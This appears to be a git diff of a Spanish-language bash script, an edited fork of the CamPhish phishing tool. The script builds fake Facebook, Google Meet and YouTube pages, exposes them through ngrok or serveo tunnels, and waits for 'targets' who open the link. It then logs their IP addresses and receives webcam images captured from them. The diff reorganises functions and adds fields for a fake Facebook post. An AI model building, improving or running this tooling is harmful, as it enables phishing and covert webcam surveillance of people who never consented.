@@ -14,7 +14,7 @@ banner() {
     printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"
 
     printf " \e[1;77m Autor original: www.techchip.net \e[0m \n"
-    printf " \e[1;77m Editado por: Darling Buenaño \e[0m \n\n"
+    printf " \e[1;77m Editado por: Darling Buenaño y Carlos Almeida \e[0m \n\n"
 }
 
 dependencies() {
@@ -47,26 +47,6 @@ catch_ip() {
     cat ip.txt >> saved.ip.txt
 }
 
-checkfound() {
-    printf "\n"
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando objetivos,\e[0m\e[1;77m Presione Ctrl + C para salir...\e[0m\n"
-    
-    while [ true ]; do
-        if [[ -e "ip.txt" ]]; then
-            printf "\n\e[1;92m[\e[0m+\e[1;92m] ¡El objetivo abrió el enlace!\n"
-            catch_ip
-            rm -rf ip.txt
-        fi
-        sleep 0.5
-
-        if [[ -e "Log.log" ]]; then
-            printf "\n\e[1;92m[\e[0m+\e[1;92m] ¡Imagen recibida!\e[0m\n"
-            rm -rf Log.log
-        fi
-        sleep 0.5
-    done
-}
-
 
 server() {
     command -v ssh > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
@@ -92,25 +72,32 @@ server() {
 }
 
 
-payload_ngrok() {
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-    sed 's+forwarding_link+'$link'+g' template.php > index.php
-    sed -i 's+ruta_template+'$ruta_template'+g' index.php
-    
-    if [[ $option_tem -eq 1 ]]; then
-        sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
-        sed 's+fes_name+'$facebook_nombre'+g' index3.html > index2.html
-
-    elif [[ $option_tem -eq 4 ]]; then
-        sed 's+Nombre_de_la_reunion+'$Nombre_de_la_reunion'+g' templates/meet/meet_t.html > templates/meet/meet.html
-        #sed -i 's+Nombre_personas_conectadas+'$Nombre_personas_conectadas'+1' templates/meet/meet.html
-
-    else
-        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
-        sed 's+live_yt_tv+'$Nombre_de_la_reunion'+g' index3.html > index2.html
+camphish() {
+    if [[ -e sendlink ]]; then
+        rm -rf sendlink
     fi
-    rm -rf index3.html
+    
+    printf "\n-----Elija el servidor de tunel----\n"    
+    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+    default_option_server="1"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elija una opción de reenvío de puertos: [Por defecto es 1] \e[0m' option_server
+    option_server="${option_server:-${default_option_server}}"
+    select_template
+    
+    if [[ $option_server -eq 2 ]]; then
+        command -v php > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
+        start
+    elif [[ $option_server -eq 1 ]]; then
+        ngrok_server
+    else
+        printf "\e[1;93m [!] Opción inválida!\e[0m\n"
+        sleep 1
+        clear
+        camphish
+    fi
 }
+
 
 select_template() {
     if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
@@ -133,23 +120,26 @@ select_template() {
 
         ########## FACEBOOK ##########
         if [[ $option_tem -eq 1 ]]; then
-            printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Simularemos una publicación de facebook \e[0m\n"
+            printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Plantilla Facebook elegida \e[0m\n"
             
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la persona que publicó: \e[0m' facebook_nombre
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la persona que publicó: \e[0m' nombre_usuario_facebook
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de perfil: \e[0m' foto_perfil_facebook
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción de la publicación: \e[0m' descripcion_facebook
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la foto de la publicación: \e[0m' foto_publicacion_facebook
+            ruta_template="facebook/facebook.html"
 
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de perfil: \e[0m' facebook_foto_perfil
-
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción de la publicación: \e[0m' facebook_descripción
-
-            read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la foto de la publicación: \e[0m' facebook_foto_publicacion
 
         ########## GOOGLE ##########
         elif [[ $option_tem -eq 2 ]]; then
             printf " Google Phising aún está en desarrollo"
+            ruta_template="google/google.html"
+
         
         ########## INSTAGRAM ##########
         elif [[ $option_tem -eq 3 ]]; then
             printf " Instagram Phising aún está en desarrollo"
+            ruta_template="instagram/instagram.html"
+
 
         ########## MEET ##########
         elif [[ $option_tem -eq 4 ]]; then
@@ -163,9 +153,11 @@ select_template() {
             #El nombre del html debe ser igual al que se generará, no al template original
             ruta_template="meet/meet.html"
 
+
         ########## YOUTUBE ##########
         elif [[ $option_tem -eq 5 ]]; then
             printf " Youtube Phising aún está en desarrollo"
+            ruta_template="youtube/youtube.html"
         
         else
             printf "\e[1;93m [!] ¡Opción de plantilla no válida! Inténtalo otra vez\e[0m\n"
@@ -174,6 +166,7 @@ select_template() {
         fi
     fi
 }
+
 
 ngrok_server() {
     if [[ -e ngrok ]]; then
@@ -214,7 +207,7 @@ ngrok_server() {
     sleep 2
     printf "\e[1;92m[\e[0m+\e[1;92m] Iniciando el servidor de ngrok...\n"
     ./ngrok http 3333 > /dev/null 2>&1 &
-    sleep 10
+    sleep 15
 
     link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
     printf "\e[1;92m[\e[0m*\e[1;92m] Link directo:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -223,33 +216,52 @@ ngrok_server() {
     checkfound
 }
 
-camphish() {
-    if [[ -e sendlink ]]; then
-        rm -rf sendlink
-    fi
+
+payload_ngrok() {
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    sed 's+forwarding_link+'$link'+g' template.php > index.php
+    sed -i 's+ruta_template+'$ruta_template'+g' index.php
     
-    printf "\n-----Elija el servidor de tunel----\n"    
-    printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-    default_option_server="1"
-    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elija una opción de reenvío de puertos: [Por defecto es 1] \e[0m' option_server
-    option_server="${option_server:-${default_option_server}}"
-    select_template
-    
-    if [[ $option_server -eq 2 ]]; then
-        command -v php > /dev/null 2>&1 || { echo >&2 "Se necesita SSH, pero no está instalado. Instálalo por favor. {Abortando...}"; exit 1; }
-        start
-    elif [[ $option_server -eq 1 ]]; then
-        ngrok_server
+    if [[ $option_tem -eq 1 ]]; then
+        sed 's+foto_perfil_facebook+'$foto_perfil_facebook'+g' templates/facebook/facebook_t.html > templates/facebook/facebook.html
+        sed -i 's+nombre_usuario_facebook+'$nombre_usuario_facebook'+g' templates/facebook/facebook.html
+        sed -i 's+descripcion_facebook+'$descripcion_facebook'+g' templates/facebook/facebook.html
+        sed -i 's+foto_publicacion_facebook+'$foto_publicacion_facebook'+g' templates/facebook/facebook.html
+
+    elif [[ $option_tem -eq 4 ]]; then
+        sed 's+Nombre_de_la_reunion+'$Nombre_de_la_reunion'+g' templates/meet/meet_t.html > templates/meet/meet.html
+        sed -i 's+Nombre_personas_conectadas+'$Nombre_personas_conectadas'+1' templates/meet/meet.html
+
     else
-        printf "\e[1;93m [!] Opción inválida!\e[0m\n"
-        sleep 1
-        clear
-        camphish
+        sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+        sed 's+live_yt_tv+'$Nombre_de_la_reunion'+g' index3.html > index2.html
     fi
+    #rm -rf index3.html
 }
 
-#casi igual a payload_ngrok()
+
+checkfound() {
+    printf "\n"
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando objetivos,\e[0m\e[1;77m Presione Ctrl + C para salir...\e[0m\n"
+    
+    while [ true ]; do
+        if [[ -e "ip.txt" ]]; then
+            printf "\n\e[1;92m[\e[0m+\e[1;92m] ¡El objetivo abrió el enlace!\n"
+            catch_ip
+            rm -rf ip.txt
+        fi
+        sleep 0.5
+
+        if [[ -e "Log.log" ]]; then
+            printf "\n\e[1;92m[\e[0m+\e[1;92m] ¡Imagen recibida!\e[0m\n"
+            rm -rf Log.log
+        fi
+        sleep 0.5
+    done
+}
+
+
+#----- Tunel Serveo -----#
 payload() {
     ruta_template="meet/meet.html"
     send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
